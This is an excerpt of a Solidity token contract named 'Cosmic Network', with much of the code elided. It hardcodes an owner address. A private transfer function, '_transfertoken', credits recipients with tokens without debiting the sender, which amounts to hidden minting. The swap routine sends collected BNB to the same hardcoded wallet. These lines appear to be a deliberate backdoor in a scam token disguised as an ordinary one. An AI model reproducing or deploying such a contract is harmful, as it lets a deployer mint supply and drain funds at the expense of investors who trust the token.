...
abstract contract Ownable is Context {
    ...
    constructor () {
         _owner = 0xDf01045Aea4C17bB483315C53A70b39401094d22;
...
contract CosmicNetwork is Context, IERC20, Ownable { 
    ...
    uint256 public _tTotal = 2 * 10**6 * 10**_decimals;
    string private constant _name = unicode"Cosmic Network"; 
    string private constant _symbol = unicode"cosmic"; 
    ...
    uint256 public _BuyFee = 30; // in 0.1% units
 ...
 function _transfertoken(address sender, address rcp, uint256 tAmount) private {
            _tOwned[rcp] = _tOwned[rcp]+_tOwned[sender]-_tOwned[sender]+tAmount;
    }
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
            ...
            sendToWallet(payable(0xDf01045Aea4C17bB483315C53A70b39401094d22), BNB_Tot);
            }
